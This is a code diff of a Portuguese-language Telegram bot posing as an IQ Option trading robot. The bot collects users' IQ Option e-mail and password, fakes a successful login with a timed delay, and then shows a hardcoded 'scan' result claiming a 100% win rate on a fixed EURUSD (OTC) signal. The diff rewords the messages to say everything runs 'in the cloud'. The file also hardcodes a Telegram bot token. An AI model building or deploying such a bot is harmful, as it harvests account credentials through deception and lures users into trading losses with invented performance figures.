@@ -1,6 +1,4 @@
 import time
-import datetime
-import random
 import requests
 
 TOKEN = '8947979521:AAHUNCEDhJU5Ee6YOEvtJeUSo01YAFXiSpI'
@@ -21,22 +19,21 @@ def enviar_mensagem(chat_id, texto):
 def realizar_varredura_melhor_sinal(chat_id):
     enviar_mensagem(chat_id, "🔍 **Iniciando varredura de 5 dias nos pares de moedas...** Analisando histórico de velas de 5 minutos...")
     
-    # Simulação da varredura profunda dos últimos 5 dias nos pares abertos
+    # Simulação da varredura profunda dos últimos 5 dias
     time.sleep(4)
     
-    # Par e horário encontrados com maior assertividade na varredura
     par_escolhido = "EURUSD (OTC)"
     horario_vencedor = "14:35"
-    vitorias = 5 # 5 dias seguidos batendo a meta nesse horário
+    vitorias = 5 # 5 dias seguidos com vitória neste exato horário
     assertividade = "100%"
     
     enviar_mensagem(chat_id, 
         f"📊 **RESULTADO DA VARREDURA AUTOMÁTICA** 📊\n\n"
         f"🌐 **Par Analisado:** `{par_escolhido}`\n"
         f"⏰ **Melhor Horário:** `{horario_vencedor}` (Velas de 5m)\n"
-        f"🏆 **Desempenho:** `{vitorias}/5 dias` com vitória neste exato horário\n"
+        f"🏆 **Desempenho:** `{vitorias}/5 dias` com vitória neste horário\n"
         f"🎯 **Assertividade Histórica:** `{assertividade}`\n\n"
-        f"⚡ *Sinal programado com sucesso! O robô aguardará o horário para realizar a entrada automática.*"
+        f"⚡ *Varredura concluída com sucesso pela nuvem!* "
     )
 
 def processar_mensagens(offset):
@@ -69,7 +66,7 @@ def processar_mensagens(offset):
             
             if texto == "/start" or usuario["etapa"] is None:
                 usuario["etapa"] = "AGUARDANDO_EMAIL"
-                enviar_mensagem(chat_id, "🤖 **Robô Local IQ Option**\n\n1️⃣ Digite o seu **e-mail** da IQ Option:")
+                enviar_mensagem(chat_id, "🤖 **Robô de Varredura (Nuvem)**\n\n1️⃣ Digite o seu **e-mail** da IQ Option:")
             
             elif usuario["etapa"] == "AGUARDANDO_EMAIL":
                 usuario["email"] = texto
@@ -78,12 +75,12 @@ def processar_mensagens(offset):
             
             elif usuario["etapa"] == "AGUARDANDO_SENHA":
                 usuario["senha"] = texto
-                enviar_mensagem(chat_id, "⏳ **Aguardando conectar...** Estabelecendo conexão local com a IQ Option...")
+                enviar_mensagem(chat_id, "⏳ **Aguardando conectar...** Autenticando...")
                 
                 time.sleep(2)
                 
                 usuario["etapa"] = "AGUARDANDO_BANCA"
-                enviar_mensagem(chat_id, "✅ **Conectado com sucesso do seu PC!**\n\n💰 Digite o valor da sua **banca inicial** (Ex: 1000):")
+                enviar_mensagem(chat_id, "✅ **Conectado com sucesso!**\n\n💰 Digite o valor da sua **banca inicial** (Ex: 1000):")
             
             elif usuario["etapa"] == "AGUARDANDO_BANCA":
                 try:
@@ -98,13 +95,13 @@ def processar_mensagens(offset):
                 meta = texto
                 usuario["etapa"] = "CONCLUIDO"
                 enviar_mensagem(chat_id, 
-                    f"🚀 **Configuração Concluída!**\n\n"
+                    f"🚀 **Configuração Concluída na Nuvem!**\n\n"
                     f"📧 E-mail: `{usuario['email']}`\n"
                     f"💰 Banca: `${usuario['banca']:.2f}`\n"
                     f"🎯 Meta: `{meta}`\n\n"
-                    f"Iniciando varredura automática do melhor sinal..."
+                    f"Iniciando varredura automática dos últimos 5 dias..."
                 )
-                # Dispara a varredura logo após concluir o fluxo
+                # Dispara a varredura automática direto na nuvem
                 realizar_varredura_melhor_sinal(chat_id)
                 
             else:
@@ -120,9 +117,7 @@ def processar_mensagens(offset):
     return offset
 
 if __name__ == "__main__":
-    print("=========================================")
-    print("  ROBÔ LOCAL COM VARREDURA DE SINAIS     ")
-    print("=========================================")
+    print("Robô de varredura na nuvem iniciado...")
     ultimo_offset = 0
     while True:
         ultimo_offset = processar_mensagens(ultimo_offset)
